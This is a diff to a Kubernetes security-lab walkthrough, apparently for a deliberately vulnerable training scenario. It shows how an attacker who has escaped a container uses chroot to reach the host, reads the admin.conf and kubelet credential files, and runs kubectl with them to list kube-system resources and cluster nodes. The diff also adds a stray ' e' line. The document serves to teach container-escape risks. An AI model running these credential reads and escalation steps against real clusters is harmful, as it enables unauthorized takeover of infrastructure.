@@ -89,7 +89,7 @@ chroot /host-system bash
 - As you can see, now you can access all the host system resources like docker containers, configurations, etc.
 
 ```bash
-docker ps
+crictl pods
 ```
 
 ![Scenario 4 chroot host](../images/sc-4-3.png)
@@ -97,7 +97,7 @@ docker ps
 - The Kubernetes node configuration can be found at the default path, which is used by the node level kubelet to talk to the Kubernetes API Server. If you can use this configuration, you gain the same privileges as the Kubernetes node.
 
 ```bash
-cat /var/lib/kubelet/kubeconfig
+cat /etc/kubernetes/admin.conf
 ```
 
 ![Scenario 4 kubelet config](../images/sc-4-4.png)
@@ -111,7 +111,7 @@ You can use the available `kubectl` command-line utility to explore other resour
 - Using the kubelet configuration to list the Kubernetes cluster-wide resources
 
 ```bash
-kubectl --kubeconfig /var/lib/kubelet/kubeconfig get all -n kube-system
+kubectl --kubeconfig /etc/kubernetes/admin.conf get all -n kube-system
 ```
 
 ![Scenario 4 get kube-system](../images/sc-4-5.png)
@@ -120,11 +120,11 @@ kubectl --kubeconfig /var/lib/kubelet/kubeconfig get all -n kube-system
 
 From here you can go beyond by performing the lateral moment and a post-exploitation based on the available setup, configuration, and resources
 :::
-
+ e
 - You are able to obtain the available nodes in the Kubernetes cluster by running the following command:
 
 ```bash
-kubectl --kubeconfig /var/lib/kubelet/kubeconfig get nodes
+kubectl --kubeconfig /etc/kubernetes/admin.conf get nodes
 ```
 
 - Hooray 🥳 , now you can see that it returns the cluster nodes available as we have the privilege/permissions with obtained configuration to query the Kubernetes API server
